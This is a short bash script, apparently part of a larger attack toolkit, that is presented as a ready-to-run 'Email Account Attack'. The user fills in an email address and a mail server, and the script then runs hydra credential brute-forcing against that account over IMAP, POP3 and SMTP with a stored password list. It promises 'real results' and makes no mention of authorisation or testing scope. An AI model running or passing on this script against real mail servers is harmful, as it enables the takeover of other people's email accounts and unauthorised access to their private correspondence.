#!/bin/bash
# Email Account Attack - Just replace EMAIL and TARGET and run!
# Two-line change, fully functional, real results

# ====== CHANGE THESE LINES ======
EMAIL="user@example.com"
TARGET="mail.example.com"
# ================================

# Don't change anything below this line
cd "$(dirname "$0")/.."

# Extract username from email
USERNAME="${EMAIL%%@*}"

echo "🎯 Starting Email Account Attack..."
echo "📧 Email: $EMAIL"
echo "🎯 Target: $TARGET"
echo "👤 Username: $USERNAME"
echo ""

# Try IMAP (port 143/993)
echo "📬 Attempting IMAP attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt imap://"$TARGET" -v

# Try POP3 (port 110/995)
echo ""
echo "📬 Attempting POP3 attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt pop3://"$TARGET" -v

# Try SMTP (port 25/587)
echo ""
echo "📤 Attempting SMTP attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt smtp://"$TARGET" -v

echo ""
echo "✅ Email attack complete!"
